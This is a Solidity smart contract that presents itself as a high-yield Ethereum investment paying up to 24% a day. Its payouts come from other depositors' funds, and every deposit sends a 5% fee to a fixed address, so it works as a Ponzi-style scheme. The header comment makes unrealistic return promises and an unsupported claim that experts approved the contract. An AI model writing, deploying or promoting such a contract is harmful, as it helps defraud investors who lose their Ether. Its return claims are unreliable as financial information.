pragma solidity ^0.4.25;

/**
 *
 * Easy Investment Ideal Contract
 *  - GAIN UP TO 24% PER 24 HOURS (every 5900 blocks)
 *
 * How to use:
 *  1. Send any amount of Ether to make an investment
 *  2a. Claim your profit by sending 0 Ether transaction (every day, every
 *      week, I don't care unless you're spending too much on GAS)
 *  OR
 *  2b. Send more Ether to reinvest AND get your profit at the same time
 * 
 * Rules:
 *  1. You cannot withdraw more than 90% of fund
 *  2. Funds from the fund cannot be withdrawn within a week after the
 *     launch of the contract
 *  3. Those who join the project with a deposit of at least 0.1 Etner
 *     during the first week after launch become premium users and
 *     receive a percentage of one and a half times more
 *     (maximum - 24% instead of 16%)
 *  4. If you invest or reinvest not less than 1 Ether, your percentage
 *     immediately rises to the maximum
 *  5. With each reinvestment of less than 1 Ether (or just when
 *     withdrawing funds), the percentage decreases by 1%
 *  6. Minimum percentage - 2%
 *
 * RECOMMENDED GAS LIMIT: 200000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 * 
 * Fee for advertising expenses - 5%
 *
 * Contract reviewed and approved by pros!
 *
 */
contract EasyInvestIdeal {
    // records the block number in which the contract was created
    uint public createdAtBlock;
    // records funds in the fund
    uint public raised;
    
    // records amounts invested
    mapping (address => uint) public invested;
    // records blocks at which investments were made
    mapping (address => uint) public atBlock;
    // records individual percentages
    mapping (address => uint) public percentages;
    // records premium users
    mapping (address => bool) public premium;

    constructor () public {
        createdAtBlock = block.number;
    }
    
    function isFirstWeek() internal view returns (bool) {
        return block.number < createdAtBlock + 5900 * 7;
    }

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (!isFirstWeek() && invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * (individual percentage) * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint amount = invested[msg.sender] * percentages[msg.sender] / 100 * (block.number - atBlock[msg.sender]) / 5900;

            if (premium[msg.sender]) {
                amount = amount * 3 / 2;
            }
            uint max = raised * 9 / 10;
            if (amount > max) {
                amount = max;
            }

            // send calculated amount of ether directly to sender (aka YOU)
            msg.sender.transfer(amount);
            raised -= amount;
        }
        
        // set individual percentage
        if (msg.value >= 1 ether) {
            percentages[msg.sender] = 16;
        } else if (percentages[msg.sender] > 2) {
            if (!isFirstWeek()) {
                percentages[msg.sender]--;
            }
        } else {
            percentages[msg.sender] = 2;
        }

        // record block number and invested amount (msg.value) of this transaction
        if (!isFirstWeek() || atBlock[msg.sender] == 0) {
            atBlock[msg.sender] = block.number;
        }
        invested[msg.sender] += msg.value;
        
        if (msg.value > 0) {
            // set premium user
            if (isFirstWeek() && msg.value >= 100 finney) {
                premium[msg.sender] = true;
            }
            // calculate fee (5%)
            uint fee = msg.value / 20;
            address(0x107C80190872022f39593D6BCe069687C78C7A7C).transfer(fee);
            raised += msg.value - fee;
        }
    }
}